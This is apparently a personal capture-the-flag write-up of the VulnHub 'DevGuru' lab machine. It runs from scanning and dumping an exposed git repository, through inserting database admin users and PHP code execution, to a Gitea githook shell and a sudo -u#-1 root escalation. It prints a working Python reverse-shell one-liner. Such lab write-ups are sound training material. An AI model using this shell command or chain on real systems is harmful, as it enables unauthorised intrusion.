# VulnHub-DevGuru

## Netdiscover

Run `netdiscover -i wlan0` or `eth0`

<img src="https://imgur.com/U8GskLr.png"/> 

Alternatively this box gives us the ip address we need to scan for nmap , however it's not common that vulhub boxes have a banner to give local ip address when they bootup.

<img src="https://imgur.com/ruFBezk.png"/>

## NMAP

Now that we have the IP address of our target let's run nmap scan on it

```
Nmap scan report for 192.168.1.138
Host is up (0.00014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: DevGuru
| http-git: 
|   192.168.1.138:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corp - DevGuru
MAC Address: 08:00:27:C2:2E:66 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
```

So from the nmap scan we have 2 ports http and ssh but we see something intersting which `.git/` also we see a domain name `devguru.local`. Add the domain to `/etc/hosts`

<img src="https://imgur.com/4cGfA58.png"/>

<img src="https://imgur.com/Rt5p5UR.png"/>

On going to `register` tab we won't be able to register any user also we haven't found any creds.

<img src="https://imgur.com/oHgxDf5.png"/>

On port 80 we can also see a home page with clicking on the tabs pretty much doesn't do anything

<img src="https://imgur.com/UdhpGQU.png"/>
So I tried ruuning gobuster and found something interesting

<img src="https://imgur.com/AxkMwmb.png"/>

<img src="https://imgur.com/XMYfJ1y.png"/>

But it's the same thing we need credentials.

I did try to find some exploits for `gitea` and `october` but end up failing so the next thing we can do is try to dump the git repository that we saw from the nmap scan.To dump the git repository what you need is called GitTools , really an awesome tool

`https://github.com/internetwache/GitTools`

<img src="https://imgur.com/Jf8YhjE.png"/>

This script is going to download whatever it can from the repository.

<img src="https://imgur.com/X24yjss.png"/>

When it finishes it will look something like this

<img src="https://imgur.com/myHKpaI.png"/>

<img src="https://imgur.com/XNe3OSF.png"/>

Going through `objects` folder you'll find bunch of directories and you won't understand how would you read it so another script of extracting useful files from `.git` is called `Extractor` which comes with `GitTools`

<img src="https://imgur.com/nn9KMFV.png"/>

As you can see it will extract all the files we'll need so you definitely want to have it in your arsenal when it comes to dealing with `.git` on the webserver

<img src="https://imgur.com/79tIOWm.png"/>

<img src="https://imgur.com/rkuLmuZ.png"/>

Now two files that you want to look at ,first `adminer.php` which is database management tool means there's a databse which is connected to web application also in `config` folder you'll find `database.php` in which you can get credentials for logging into the database 

<img src="https://imgur.com/RpcLZ62.png"/>

<img src="https://imgur.com/FBGzWYp.png"/>

<img src="https://imgur.com/E2fuSWE.png"/>

Now we are logged in and we can pretty much do everything with the database so let's try creating a new user in the database or we can just clone the `frank` user but here we have to specify the password in that hash which is `bcrypt` seeing identifying it as it is starting from `$2$` 

Goto `cyberchef` or any other website from which you can generate a text to bcrypt hash and add it in the password field

<img src="https://imgur.com/xEAStaA.png"/> 

<img src="https://imgur.com/nJG03cp.png"/>

<img src="https://imgur.com/fuF2FRk.png"/>

Now we have added a new user and we should be able to login to the page we found through `gobuster`

<img src="https://imgur.com/FC2sUxX.png"/>

In order to get a shell from the october cms there something we can do is run php code inside html page but it's a little different.

Through goolging around a little I was able to find a forum where people asked about this thing and got several answers but the code that worked for me was

<img src="https://imgur.com/xlofAzs.png"/>

So let's try testing if this actually works

<img src="https://imgur.com/weWym8c.png"/>

<img src="https://imgur.com/qaJC62U.png"/>

This works so now we just have to setup a GET parameter in the code and run system commands

<img src="https://imgur.com/wbN92tc.png"/>

<img src="https://imgur.com/mTTcV5c.png"/>

We are almost just there (not really it is a real pain), just need a reverse shell.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
This one worked for me

<img src="https://imgur.com/ZKCX50B.png"/>

Once we got in the things we could is to just look for any cronjob ruuning or to see if we can run anything as sudo

<img src="https://imgur.com/uVz8EHt.png"/>

But got no luck, now only options is to run `linpeas` and hope it finds something

<img src="https://imgur.com/e2HBws6.png"/>

<img src="https://imgur.com/F27JlAq.png"/>

Now it found something interesting which is a backup configuration file of that `gitea`. From that file we find creds for `gitea`'s database

<img src="https://imgur.com/E1Ix2Lu.png"/>


<img src="https://imgur.com/SKKhMFA.png"/>

We now have access to gitea database but here we have to add a new user in order to login to `gitea`

<img src="https://imgur.com/Fevo7ER.png"/>

<img src="https://imgur.com/lggp0ti.png"/>

It may look that it's only allowing pbkdf2 hashes but bcrypt also works

<img src="https://imgur.com/CuL90QX.png"/>

Now to get a reverse shell there is actullay an exploit for it 

`https://security.szurek.pl/en/gitea-1-4-0-unauthenticated-rce/`

By going through it explained we can get `remote code execution` if we have an administrator account on `gitea` because we need to have `githooks` to be enabled which is just a script that runs automatically whenever an event occurs on github repository. So what we are going to do is 

1. Create a repository (doesn't matter if it's empty)

2. Go to settings of the repository , githooks , click on update then add a reverse shell

3. Clone the repository

4. Add a file to the repository

5. Commit

6. Push

<img src="https://imgur.com/q8vnYmY.png"/>

<img src="https://imgur.com/QWfOLok.png"/>

<img src="https://imgur.com/SAlRS1q.png"/>

<img src="https://imgur.com/vlcqvrH.png"/>

<img src="https://imgur.com/saEKeue.png"/>

<img src="https://imgur.com/CFuHZLz.png"/>

And now if we go to our netcat listener , we will have a shell as `frank`

<img src="https://imgur.com/yNiz4YN.png"/>

<img src="https://imgur.com/gfTmCks.png"/>

<img src="https://imgur.com/4MBiuur.png"/>

Going throguh man pages of `sudoers` it says that we can run this can be ran as any user but not as `root`.

<img src="https://imgur.com/kbZNTkr.png"/>

Now a vulnerability exists in this scenario when a user is allowed to execute command as other users but not as root so when specifiy a user with `-u` and user id with `-1` it's going to consider is a `root` with id `0`

`https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability`

<img src="https://imgur.com/9ihFY4q.png"/>

So this was a really an intersting box that we had to dump the git repository then look for important files after that got our intial foothold as `www-data` through that looked for some configuration files ,edit database ,add repository then pushed our changes into it did learned a lot from this ,it was my first vulnhub machine that I rooted !!!
